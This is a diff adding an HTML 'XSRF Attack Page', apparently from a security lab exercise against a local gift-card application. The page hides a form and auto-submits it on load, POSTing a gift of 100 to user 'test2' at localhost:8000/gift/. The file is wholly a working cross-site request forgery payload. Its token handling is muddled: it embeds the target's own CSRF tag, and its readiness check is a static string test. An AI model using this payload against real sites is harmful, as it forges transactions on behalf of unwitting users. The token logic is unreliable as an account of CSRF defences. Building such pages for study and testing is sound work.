@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSRF Attack Page</title>
+</head>
+<body>
+    <h1>XSRF Attack Page</h1>
+    
+    <!-- This form will automatically submit on page load -->
+    <form id="xsrfForm" action="http://localhost:8000/gift/" method="POST">
+        <!-- Include the CSRF token -->
+        {% csrf_token %}
+        
+        <!-- Hidden input fields for form data -->
+        <input type="hidden" name="username" value="test2">
+        <input type="hidden" name="amount" value="100"> <!-- Gift card amount -->
+        
+        <!-- Submit button (hidden) -->
+        <button type="submit" style="display: none;"></button>
+        
+        <!-- JavaScript to submit the form after CSRF token is ready -->
+        <script>
+            // Function to submit the form
+            function submitForm() {
+                document.getElementById('xsrfForm').submit();
+            }
+            
+            // Check if CSRF token is ready
+            if ('{{ csrf_token }}') {
+                // CSRF token is ready, submit the form
+                submitForm();
+            } else {
+                // CSRF token is not ready, wait for a short delay and try again
+                setTimeout(submitForm, 1000); // Adjust the delay as needed
+            }
+        </script>
+    </form>
+</body>
+</html>
